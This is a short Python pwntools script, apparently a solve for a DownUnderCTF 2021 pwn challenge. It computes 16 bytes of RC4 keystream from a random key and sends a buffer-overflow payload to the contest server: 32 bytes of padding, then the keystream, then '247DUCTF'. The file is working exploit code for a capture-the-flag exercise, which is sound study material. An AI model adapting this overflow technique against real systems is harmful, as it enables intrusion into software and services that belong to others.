from pwn import *


def myord(b):
	try:
		if(type(b) == str):
			return ord(b)
		return int.from_bytes(b, "little")
	except:
		print(b)


def init_RC4_key(random):
	j = 0
	s = []
	for i in range(256):
		s.append(chr(i))

	
	for i in range(256):
		j = (j + ord(s[i]) + random[i%16]  ) % 256
		tmp = s[i]
		s[i] = s[j]
		s[j] = tmp
	return "".join(s)  # string


def RC4_encrypt(s):    # str
	i = 0
	j = 0
	n = 0

	result = ""

	l = []
	for i in range(len(s)):
		l.append(s[i])
	i = 0
	for k in range(16):
		i = (i+1)%256
		#print("i: " + str(i))
		j = (j + ord(l[i]) ) % 256
		#print("j: " + str(j))
		#print("s[i]: " + hex(ord(l[i]))[2:].zfill(2))
		#print("s[j]: " + hex(ord(l[j]))[2:].zfill(2))
		tmp = l[i]
		l[i] = l[j]
		l[j] = tmp
		n = l[(ord(l[i]) + ord(l[j])) % 256]
		#print("n: " + hex(ord(n))[2:].zfill(2))
		result += n

	return result


r = remote("pwn-2021.duc.tf", 31902)
r.recvuntil(b'>')

def strtohex(str):
	result = ""
	for i in range(len(str)):
		result += hex(ord(str[i]))[2:].zfill(2)
	return result



key = open("/dev/urandom","rb").read(16)
s = init_RC4_key(key)
#print(strtohex(s))
sixteenbyte = RC4_encrypt(s)
#print(strtohex(sixteenbyte))


payload = "a"*32
payload += sixteenbyte
payload += "247DUCTF"

#print(len(payload))

r.send(payload)


print(r.recvline())
print(r.recvline())


